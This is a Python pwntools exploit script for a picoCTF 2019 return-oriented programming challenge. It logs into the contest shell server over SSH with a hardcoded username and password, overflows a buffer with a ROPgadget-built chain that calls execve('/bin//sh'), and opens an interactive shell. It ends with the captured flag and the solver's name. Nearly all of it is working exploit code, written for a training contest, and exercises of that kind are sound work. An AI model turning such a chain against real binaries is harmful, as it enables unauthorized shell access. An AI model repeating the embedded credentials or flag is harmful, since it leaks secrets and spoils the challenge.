#!/usr/bin/env python3

from pwn import *
from struct import pack

exe = ELF("vuln")

context.binary = exe

def conn():
	if False:
		return process([exe.path])
	else:
		shell = ssh(host='2019shell1.picoctf.com', user='giggsterpuku', password='7WH@L3ftc2')
		return shell.process('vuln', cwd='/problems/rop32_2_8cd220e3284b3f110fe852cc6ec9e564')


def main():
	r = conn()
	r.recvuntil('one?')
	# execve generated by ROPgadget
	# Padding goes here
	p = bytes('a'*28, 'utf-8')
	p += pack('<I', 0x0806ee6b) # pop edx ; ret
	p += pack('<I', 0x080da060) # @ .data
	p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
	p += bytes('/bin', 'utf-8')
	p += pack('<I', 0x080da060) # padding without overwrite edx
	p += pack('<I', 0x41414141) # padding
	p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806ee6b) # pop edx ; ret
	p += pack('<I', 0x080da064) # @ .data + 4
	p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
	p += bytes('//sh', 'utf-8')
	p += pack('<I', 0x080da064) # padding without overwrite edx
	p += pack('<I', 0x41414141) # padding
	p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806ee6b) # pop edx ; ret
	p += pack('<I', 0x080da068) # @ .data + 8
	p += pack('<I', 0x08056420) # xor eax, eax ; ret
	p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080da060) # @ .data
	p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080da068) # @ .data + 8
	p += pack('<I', 0x080da060) # padding without overwrite ebx
	p += pack('<I', 0x0806ee6b) # pop edx ; ret
	p += pack('<I', 0x080da068) # @ .data + 8
	p += pack('<I', 0x08056420) # xor eax, eax ; ret
	p += pack('<I', 0x0807c2fa) # inc eax ; ret
	p += pack('<I', 0x0807c2fa) # inc eax ; ret
	p += pack('<I', 0x0807c2fa) # inc eax ; ret
	p += pack('<I', 0x0807c2fa) # inc eax ; ret
	p += pack('<I', 0x0807c2fa) # inc eax ; ret
	p += pack('<I', 0x0807c2fa) # inc eax ; ret
	p += pack('<I', 0x0807c2fa) # inc eax ; ret
	p += pack('<I', 0x0807c2fa) # inc eax ; ret
	p += pack('<I', 0x0807c2fa) # inc eax ; ret
	p += pack('<I', 0x0807c2fa) # inc eax ; ret
	p += pack('<I', 0x0807c2fa) # inc eax ; ret
	p += pack('<I', 0x08049563) # int 0x80
	r.sendline(p)
	r.interactive()


if __name__ == "__main__":
	main()

# Flag: picoCTF{rOp_t0_b1n_sH_44c05daa}
# Solved by: Ryan Nguyen
